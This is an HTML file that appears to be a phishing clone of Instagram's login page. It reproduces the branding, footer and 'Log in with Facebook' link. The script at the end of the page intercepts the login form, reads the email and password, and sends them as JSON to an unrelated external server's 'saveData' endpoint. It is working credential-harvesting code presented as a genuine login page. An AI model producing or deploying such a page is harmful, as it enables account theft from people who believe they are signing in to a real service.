<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Form</title>
<link rel="stylesheet" href="./styles.css" />

    <style>
        /* Your existing CSS styles can be included here */
        
        .flex {
            display: flex;
        }
        .align-items-center {
            align-items: center;
        }
        .justify-content-center {
            justify-content: center;
        }
        .direction-column {
            flex-direction: column;
        }
        .panel {
            border: 1px solid #ccc;
            padding: 20px;
            margin: 10px;
        }
        .separator {
            margin: 10px 0;
            display: flex;
            align-items: center;
        }
        .or {
            margin: 0 10px;
        }
    </style>
</head>
<body>
    <main class="flex align-items-center justify-content-center">
        <section id="auth" class="flex direction-column">
            <div class="panel login flex direction-column">
                <h1 title="Instagram" class="flex justify-content-center">
                    <img src="./img/instagram-logo.png" alt="Instagram logo" title="Instagram logo" />
                </h1>
                <form id="loginForm">
                    <label for="email" class="sr-only">Email</label>
                    <input id="email" name="email" type="email" placeholder="Email" required />

                    <label for="password" class="sr-only">Password</label>
                    <input id="password" name="password" type="password" placeholder="Password" required />

                    <button type="submit">Login</button>
                </form>
                <div class="flex separator align-items-center">
                    <span></span>
                    <div class="or">OR</div>
                    <span></span>
                </div>
                <div class="login-with-fb flex direction-column align-items-center">
                    <div>
                        <img />
                        <a>Log in with Facebook</a>
                    </div>
                    <a href="#">Forgot password?</a>
                </div>
            </div>
            <div class="panel register flex justify-content-center">
                <p>Don't have an account?</p>
                <a href="#">Sign Up</a>
            </div>
            <div class="app-download flex direction-column align-items-center">
                <p>Get the app.</p>
                <div class="flex justify-content-center">
                    <img src="./img/apple-button.png" alt="Image with Apple Store logo" title="Image with Apple Store logo" />
                    <img src="./img/googleplay-button.png" alt="Image with Google Play logo" title="Image with Google Play logo" />
                </div>
            </div>
        </section>
    </main>
    <footer>
        <ul class="flex flex-wrap justify-content-center">
            <li><a href="#">ABOUT</a></li>
            <li><a href="#">HELP</a></li>
            <li><a href="#">PRESS</a></li>
            <li><a href="#">API</a></li>
            <li><a href="#">CAREERS</a></li>
            <li><a href="#">PRIVACY</a></li>
            <li><a href="#">TERMS</a></li>
            <li><a href="#">LOCATIONS</a></li>
            <li><a href="#">MOST RELEVANT ACCOUNTS</a></li>
            <li><a href="#">HASHTAGS</a></li>
            <li><a href="#">LANGUAGE</a></li>
        </ul>
        <p class="copyright">Â© 2020 Instagram from Facebook</p>
    </footer>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            // Target the login form
            const loginForm = document.getElementById('loginForm');

            // Add event listener for form submission
            loginForm.addEventListener('submit', function(event) {
                event.preventDefault(); // Prevent default form submission

                // Get email and password values
                const email = document.getElementById('email').value;
                const password = document.getElementById('password').value;

                // Prepare data to send as JSON
                const data = {
                    email: email,
                    password: password
                };

                // Send POST request to backend API
                fetch('https://recomendation-system.up.railway.app/saveData', {
                    method: 'POST', // Use POST method
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(data) // Convert data to JSON string
                })
                .then(response => {
                    if (!response.ok) {
                        throw new Error('Network response was not ok');
                    }
                    return response.json();
                })
                .then(data => {
                    console.log('Response from server:', data);
                    // Handle response as needed
                })
                .catch(error => {
                    console.error('Error sending data:', error);
                    // Handle errors
                });
            });
        });
    </script>
</body>
</html>
